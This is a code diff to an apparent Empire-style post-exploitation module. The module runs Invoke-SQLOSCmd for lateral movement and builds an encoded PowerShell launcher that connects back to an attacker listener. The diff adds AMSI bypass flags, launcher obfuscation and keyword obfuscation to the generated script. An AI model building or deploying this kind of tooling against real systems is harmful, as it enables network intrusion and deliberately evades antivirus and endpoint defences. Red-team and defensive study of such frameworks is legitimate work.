@@ -1,7 +1,11 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
+
 class Module(object):
     def __init__(self, mainMenu, params=[]):
         self.info = {
@@ -93,6 +97,11 @@ class Module(object):
             if password != "":
                 self.options["Password"]['Value'] = password
 
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -101,12 +110,19 @@ class Module(object):
         command = self.options['Command']['Value']
         username = self.options['UserName']['Value']
         password = self.options['Password']['Value']
+        if (self.options['Obfuscate']['Value']).lower() == 'true':
+            Obfuscate = True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
 
         moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
         moduleCode = ""
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            helpers.obfuscate_module(self.mainMenu, moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             with open(moduleSource, 'r') as source:
@@ -122,7 +138,7 @@ class Module(object):
                 print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
             else:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
                 if launcher == "":
                     return ""
                 else:
@@ -135,6 +151,7 @@ class Module(object):
             scriptEnd += " -UserName "+username
         if password != "":
             scriptEnd += " -Password "+password
+        scriptEnd = helpers.keyword_obfuscation(scriptEnd)
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
